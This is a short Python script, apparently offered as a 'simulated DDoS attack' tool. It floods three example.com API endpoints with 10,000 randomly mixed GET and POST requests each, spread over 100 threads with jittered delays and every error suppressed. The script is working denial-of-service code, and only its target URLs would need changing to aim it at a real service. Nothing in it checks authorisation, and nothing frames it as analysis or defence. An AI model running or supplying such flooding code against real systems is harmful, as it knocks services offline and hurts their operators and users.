import requests
import threading
import time
import random

def send_requests(target_url, num_requests):
    for _ in range(num_requests):
        try:
            method = random.choice(["GET", "POST"])
            if method == "GET":
                requests.get(target_url)
            else:
                requests.post(target_url, data={"key": "value"})
            time.sleep(random.uniform(0.01, 0.1))  # Random delay between requests
        except Exception as e:
            pass  # Handle potential exceptions like connection errors

def simulate_ddos_attack(target_url, total_requests, num_threads):
    requests_per_thread = total_requests // num_threads
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(target_url, requests_per_thread))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_urls = [
        'http://example.com/api/v1/resource1',
        'http://example.com/api/v1/resource2',
        'http://example.com/api/v1/resource3'
    ]

    # Simulate a realistic DDoS attack
    total_requests = 10000  # Total number of requests
    num_threads = 100       # Number of concurrent threads

    start_time = time.time()
    for target_url in target_urls:
        simulate_ddos_attack(target_url, total_requests, num_threads)
    end_time = time.time()

    print(f"Simulated DDoS attack completed in {end_time - start_time:.2f} seconds")
